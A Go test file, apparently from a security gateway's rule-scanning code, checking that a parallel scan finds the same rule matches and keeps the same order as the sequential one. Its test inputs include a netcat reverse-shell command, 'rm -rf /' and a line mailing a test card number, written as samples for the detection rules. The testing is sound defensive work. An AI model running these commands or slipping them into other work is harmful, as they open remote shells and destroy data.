// Copyright 2026 Cisco Systems, Inc. and its affiliates
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// SPDX-License-Identifier: Apache-2.0

package gateway

import (
	"runtime"
	"strings"
	"testing"

	"github.com/defenseclaw/defenseclaw/internal/rxprefilter"
)

// TestParallelRuleScanAnswersAreTheSequentialAnswers pins that the rules
// matched ahead on several goroutines for a large text answer exactly what the
// scan loop answers for each rule alone (same match offsets, same rules
// without a match), for a text that holds matches and for a benign twin that
// holds none.
func TestParallelRuleScanAnswersAreTheSequentialAnswers(t *testing.T) {
	if runtime.GOMAXPROCS(0) < 2 {
		t.Skip("one processor: the scan stays on the calling goroutine")
	}
	filler := strings.Repeat("note lorem ipsum dolor sit amet consectetur adipiscing elit 123456\n", 2<<10)
	if len(filler) < parallelRuleScanMinText {
		t.Fatalf("filler is %d bytes, below the parallel bound", len(filler))
	}
	for _, tc := range []struct {
		name, text string
		matches    bool
	}{
		{"matches", filler + "nc -e /bin/sh 203.0.113.9 4444\nrm -rf /\nmail alice@example.com card 4111 1111 1111 1111\n" + filler, true},
		{"benign twin", filler + "ls -la\n" + filler, false},
	} {
		t.Run(tc.name, func(t *testing.T) {
			generation := snapshotRulePackGeneration("")
			scan := rxprefilter.NewText(tc.text)
			raw := &ruleScanText{text: tc.text}
			ahead := scanRuleMatchesInParallel(generation, ruleScanOptions{}, map[string]bool{}, raw, scan)
			if len(ahead) == 0 {
				t.Fatal("no rule was matched ahead")
			}
			found := 0
			for rule, got := range ahead {
				var want []int
				if (&ruleScanText{text: tc.text}).mayMatch(rule.Pattern) {
					want = firstAcceptedRuleMatchIn(*rule, rxprefilter.NewText(tc.text))
				}
				if len(got) != len(want) || (len(got) == 2 && (got[0] != want[0] || got[1] != want[1])) {
					t.Fatalf("rule %s: matched ahead %v, scan loop %v", rule.ID, got, want)
				}
				if got != nil {
					found++
				}
			}
			if (found > 0) != tc.matches {
				t.Fatalf("%d rules matched, want matches=%t", found, tc.matches)
			}
		})
	}
}

// TestParallelRuleScanFindingsStayInRuleOrder pins that a large text reports
// the rules a small one reports, in the same order, and that a rule ID is
// reported once.
func TestParallelRuleScanFindingsStayInRuleOrder(t *testing.T) {
	generation := snapshotRulePackGeneration("")
	attack := "nc -e /bin/sh 203.0.113.9 4444\nrm -rf /\n"
	filler := strings.Repeat("note lorem ipsum dolor sit amet consectetur adipiscing elit 123456\n", 2<<10)
	small := scanRuleGeneration(generation, attack, "shell", ruleScanOptions{})
	large := scanRuleGeneration(generation, filler+attack+filler, "shell", ruleScanOptions{})
	if len(small) == 0 {
		t.Fatal("the small text matched no rule")
	}
	seen := map[string]bool{}
	var order []string
	for _, finding := range large {
		if seen[finding.RuleID] {
			t.Fatalf("rule %s reported twice", finding.RuleID)
		}
		seen[finding.RuleID] = true
		order = append(order, finding.RuleID)
	}
	next := 0
	for _, finding := range small {
		for next < len(order) && order[next] != finding.RuleID {
			next++
		}
		if next == len(order) {
			t.Fatalf("rule %s of the small text is missing or out of order in the large text: %v", finding.RuleID, order)
		}
	}
}
